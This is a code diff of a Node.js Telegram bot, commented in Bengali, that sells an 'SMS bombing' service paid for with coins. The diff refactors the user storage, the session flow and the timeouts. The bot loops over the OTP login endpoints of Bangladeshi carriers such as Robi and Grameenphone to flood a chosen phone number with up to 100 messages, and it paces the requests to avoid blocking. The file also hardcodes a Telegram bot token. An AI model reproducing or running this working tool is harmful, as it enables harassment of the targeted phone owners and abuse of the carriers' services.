@@ -7,39 +7,23 @@ const BOT_TOKEN = '8452171958:AAFElgfh2yXz7VurqsOBZD3AJIpvTCB8GmE';
 const ADMIN_ID = 5967798239;
 const bot = new Telegraf(BOT_TOKEN);
 
-// এক্সপ্রেস সার্ভার (Render এর জন্য)
-const app = express();
-app.get('/', (req, res) => res.send('Bot is Running!'));
-app.listen(process.env.PORT || 3000);
-
-// ডাটাবেস ফাইল পাথ (সহজ ইউজার ডাটা সংরক্ষণের জন্য)
-const DB_FILE = './users_db.json';
-
-// ডাটা লোড করা
+// Database Setup (Simple JSON file)
+const DB_FILE = './users.json';
 let userData = {};
 if (fs.existsSync(DB_FILE)) {
     userData = JSON.parse(fs.readFileSync(DB_FILE));
 }
 
-// ডাটা সেভ করার ফাংশন
-function saveDB() {
+function saveData() {
     fs.writeFileSync(DB_FILE, JSON.stringify(userData, null, 2));
 }
 
-// ইউজার চেক বা ক্রিয়েট ফাংশন
-function getUser(id) {
-    if (!userData[id]) {
-        userData[id] = {
-            points: 0,
-            lastBonus: 0,
-            status: 'idle'
-        };
-        saveDB();
-    }
-    return userData[id];
-}
+// Render server
+const app = express();
+app.get('/', (req, res) => res.send('Bot is Running!'));
+app.listen(process.env.PORT || 3000);
 
-// API লিস্ট
+// API List
 const SMS_APIS = [
     { url: "https://robiwifi-mw.robi.com.bd/fwa/api/v1/customer/auth/otp/login", method: "POST", headers: { 'Content-Type': 'application/json', 'Referer': 'https://robiwifi.robi.com.bd/' }, data: p => ({ login: p }) },
     { url: "https://weblogin.grameenphone.com/backend/api/v1/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
@@ -89,109 +73,126 @@ const SMS_APIS = [
 
 bot.use(session());
 
-// কিবোর্ড মেনু
+// Keyboards
 const mainMenu = Markup.keyboard([
     ['🚀 Boom', '💰 Balance'],
     ['🎁 Daily Bonus', 'ℹ️ Info']
 ]).resize();
 
-// স্টার্ট কমান্ড
+// Helper to register user
+function registerUser(uid) {
+    if (!userData[uid]) {
+        userData[uid] = { coins: 50, lastBonus: 0 }; // New users get 50 free coins
+        saveData();
+    }
+}
+
 bot.start((ctx) => {
-    const user = getUser(ctx.from.id);
-    ctx.reply(`👋 স্বাগতম!\nআপনার UID: ${ctx.from.id}\nনিচের বাটনগুলো ব্যবহার করুন অথবা সরাসরি /bm লিখুন।`, mainMenu);
+    const uid = ctx.from.id;
+    registerUser(uid);
+    ctx.reply(`👋 স্বাগতম!\nআপনার UID: ${uid}\nনিচের বাটন ব্যবহার করুন।`, mainMenu);
 });
 
-// কমান্ড ভিত্তিক বোম্বিং (/bm 017xxx 10)
-bot.hears(/^\/bm\s+(\d{11})\s+(\d+)$/, async (ctx) => {
-    const phone = ctx.match[1];
-    const amount = parseInt(ctx.match[2]);
-    await startBombing(ctx, phone, amount);
+// Admin Recharge Command: /recharge uid amount
+bot.command('recharge', (ctx) => {
+    if (ctx.from.id !== ADMIN_ID) return ctx.reply("❌ আপনি এডমিন নন!");
+    const args = ctx.message.text.split(' ');
+    if (args.length !== 3) return ctx.reply("ব্যবহার: /recharge <uid> <amount>");
+    
+    const targetUid = args[1];
+    const amount = parseInt(args[2]);
+
+    if (!userData[targetUid]) return ctx.reply("❌ ইউজার খুঁজে পাওয়া যায়নি!");
+    
+    userData[targetUid].coins += amount;
+    saveData();
+    ctx.reply(`✅ ইউজার ${targetUid} কে ${amount} কয়েন দেওয়া হয়েছে।`);
+    bot.telegram.sendMessage(targetUid, `💰 এডমিন আপনাকে ${amount} কয়েন পাঠিয়েছেন!`);
 });
 
-// বাটন হ্যান্ডলিং
+// Command BM Logic: /bm number amount
+bot.command('bm', async (ctx) => {
+    const uid = ctx.from.id;
+    registerUser(uid);
+    const args = ctx.message.text.split(' ');
+    if (args.length !== 3) return ctx.reply("ব্যবহার: /bm 017xxxxxxxx 15");
+
+    const phone = args[1];
+    const amount = parseInt(args[2]);
+
+    if (!/^01[3-9]\d{8}$/.test(phone)) return ctx.reply("❌ ভুল নম্বর!");
+    if (isNaN(amount) || amount <= 0 || amount > 100) return ctx.reply("❌ সর্বোচ্চ ১০০ বার পাঠানো যাবে।");
+    if (userData[uid].coins < amount) return ctx.reply(`❌ পর্যাপ্ত কয়েন নেই! দরকার: ${amount}, আছে: ${userData[uid].coins}`);
+
+    runBombing(ctx, phone, amount);
+});
+
+// Button Handlers
 bot.hears('💰 Balance', (ctx) => {
-    const user = getUser(ctx.from.id);
-    ctx.reply(`💳 আপনার বর্তমান ব্যালেন্স: ${user.points} কয়েন।`);
+    const uid = ctx.from.id;
+    registerUser(uid);
+    ctx.reply(`💰 আপনার বর্তমান ব্যালেন্স: ${userData[uid].coins} কয়েন।`);
 });
 
 bot.hears('ℹ️ Info', (ctx) => {
-    ctx.reply(`👤 আপনার UID: ${ctx.from.id}\n🛠 Admin: @Tnayem48\n\nকয়েন রিচার্জের জন্য এডমিনের সাথে যোগাযোগ করুন।`);
+    ctx.reply(`🆔 আপনার UID: ${ctx.from.id}\n👤 Contact Admin for recharge: @Tnayem48`);
 });
 
 bot.hears('🎁 Daily Bonus', (ctx) => {
-    const user = getUser(ctx.from.id);
+    const uid = ctx.from.id;
+    registerUser(uid);
     const now = Date.now();
-    const waitTime = 24 * 60 * 60 * 1000; // ২৪ ঘণ্টা
+    const lastBonus = userData[uid].lastBonus || 0;
+    const diff = (now - lastBonus) / (1000 * 60 * 60);
 
-    if (now - user.lastBonus < waitTime) {
-        const remaining = waitTime - (now - user.lastBonus);
-        const hours = Math.floor(remaining / (1000 * 60 * 60));
-        ctx.reply(`❌ আপনি ইতিমধ্যে বোনাস নিয়েছেন! আরও ${hours} ঘণ্টা পর চেষ্টা করুন।`);
+    if (diff >= 24) {
+        userData[uid].coins += 100;
+        userData[uid].lastBonus = now;
+        saveData();
+        ctx.reply("✅ অভিনন্দন! আপনি ১০০ কয়েন ডেইলি বোনাস পেয়েছেন।");
     } else {
-        user.points += 100;
-        user.lastBonus = now;
-        saveDB();
-        ctx.reply(`✅ অভিনন্দন! আপনি ১০০ কয়েন ডেইলি বোনাস পেয়েছেন।`);
+        const remaining = (24 - diff).toFixed(1);
+        ctx.reply(`❌ আপনি ইতিমধ্যে বোনাস নিয়েছেন! আবার ${remaining} ঘণ্টা পর চেষ্টা করুন।`);
     }
 });
 
 bot.hears('🚀 Boom', (ctx) => {
-    const user = getUser(ctx.from.id);
-    user.status = 'waiting_phone';
-    ctx.reply('📱 মোবাইল নম্বরটি দিন (১১ ডিজিট):');
+    ctx.session = { step: 'get_phone' };
+    ctx.reply("📱 নম্বর দিন (১১ ডিজিট):");
 });
 
-// এডমিন রিচার্জ কমান্ড (/recharge uid amount)
-bot.command('recharge', (ctx) => {
-    if (ctx.from.id !== ADMIN_ID) return ctx.reply("❌ আপনি এডমিন নন!");
-    
-    const args = ctx.message.text.split(' ');
-    if (args.length !== 3) return ctx.reply("সঠিক নিয়ম: /recharge [UID] [Amount]");
-
-    const targetId = args[1];
-    const amount = parseInt(args[2]);
-
-    if (!userData[targetId]) return ctx.reply("❌ ইউজার খুঁজে পাওয়া যায়নি!");
-    
-    userData[targetId].points += amount;
-    saveDB();
-    ctx.reply(`✅ সফল! ইউজার ${targetId} কে ${amount} কয়েন দেওয়া হয়েছে।`);
-    bot.telegram.sendMessage(targetId, `🎁 এডমিন আপনার একাউন্টে ${amount} কয়েন যোগ করেছেন!`);
-});
-
-// টেক্সট মেসেজ প্রসেসিং
+// Input handling for "Boom" button flow
 bot.on('text', async (ctx) => {
-    const user = getUser(ctx.from.id);
+    const uid = ctx.from.id;
+    registerUser(uid);
     const text = ctx.message.text;
 
-    if (user.status === 'waiting_phone') {
+    if (ctx.session?.step === 'get_phone') {
         if (/^01[3-9]\d{8}$/.test(text)) {
-            user.phone = text;
-            user.status = 'waiting_amount';
-            ctx.reply(`✅ নম্বর: ${text}\nএবারে কতটি SMS পাঠাতে চান (পরিমাণ) লিখুন:`);
+            ctx.session.phone = text;
+            ctx.session.step = 'get_amount';
+            ctx.reply("🔢 কতটি পাঠাতে চান? (১ কয়েন প্রতি SMS):");
         } else {
-            ctx.reply("❌ ভুল নম্বর! সঠিক ১১ ডিজিট নম্বর দিন।");
+            ctx.reply("❌ ভুল নম্বর!");
         }
-    } else if (user.status === 'waiting_amount') {
+    } else if (ctx.session?.step === 'get_amount') {
         const amount = parseInt(text);
         if (isNaN(amount) || amount <= 0 || amount > 100) {
-            ctx.reply("❌ দয়া করে ১ থেকে ১০০ এর মধ্যে সংখ্যা দিন।");
+            ctx.reply("❌ ১-১০০ এর মধ্যে সংখ্যা দিন।");
+        } else if (userData[uid].coins < amount) {
+            ctx.reply(`❌ পর্যাপ্ত কয়েন নেই! আছে: ${userData[uid].coins}`);
+            ctx.session = {};
         } else {
-            user.status = 'idle';
-            await startBombing(ctx, user.phone, amount);
+            runBombing(ctx, ctx.session.phone, amount);
+            ctx.session = {};
         }
     }
 });
 
-// বোম্বিং ফাংশন
-async function startBombing(ctx, phone, amount) {
-    const user = getUser(ctx.from.id);
-    
-    if (user.points < amount) {
-        return ctx.reply(`❌ আপনার পর্যাপ্ত ব্যালেন্স নেই! \nপ্রয়োজন: ${amount} কয়েন\nআপনার আছে: ${user.points} কয়েন।`);
-    }
-
-    ctx.reply(`🚀 কাজ শুরু হচ্ছে...\n📱 নম্বর: ${phone}\n🔢 পরিমাণ: ${amount}\n💰 খরচ: ${amount} কয়েন`);
+// Core Function to execute Bombing
+async function runBombing(ctx, phone, amount) {
+    const uid = ctx.from.id;
+    ctx.reply(`🚀 ${phone} নম্বরে ${amount} টি SMS পাঠানো শুরু হচ্ছে...`);
 
     let successCount = 0;
     let errorCount = 0;
@@ -204,7 +205,7 @@ async function startBombing(ctx, phone, amount) {
                 method: api.method,
                 url: api.url,
                 headers: api.headers || {},
-                timeout: 5000
+                timeout: 4000
             };
             if (api.method === "POST") config.data = api.data(phone);
             else config.params = api.params(phone);
@@ -215,15 +216,18 @@ async function startBombing(ctx, phone, amount) {
             errorCount++;
         }
         apiIndex++;
-        // API এর মাঝে সামান্য গ্যাপ রাখা যাতে ব্লক না হয়
-        await new Promise(r => setTimeout(r, 300));
+        await new Promise(r => setTimeout(r, 400));
     }
 
-    // কয়েন কাটা
-    user.points -= amount;
-    saveDB();
+    // Deduct coins
+    userData[uid].coins -= amount;
+    saveData();
 
-    ctx.reply(`✅ সম্পন্ন!\n\n📊 রিপোর্ট:\n🎯 সফল: ${successCount}\n⚠️ ব্যর্থ: ${errorCount}\n💳 অবশিষ্ট ব্যালেন্স: ${user.points} কয়েন`, mainMenu);
+    ctx.reply(`✅ সম্পন্ন!\n🎯 সফল: ${successCount}\n⚠️ ব্যর্থ রিকোয়েস্ট: ${errorCount}\n💰 নতুন ব্যালেন্স: ${userData[uid].coins}`, mainMenu);
 }
 
-bot.launch();
+bot.launch().then(() => console.log("Bot started!"));
+
+// Graceful stop
+process.once('SIGINT', () => bot.stop('SIGINT'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
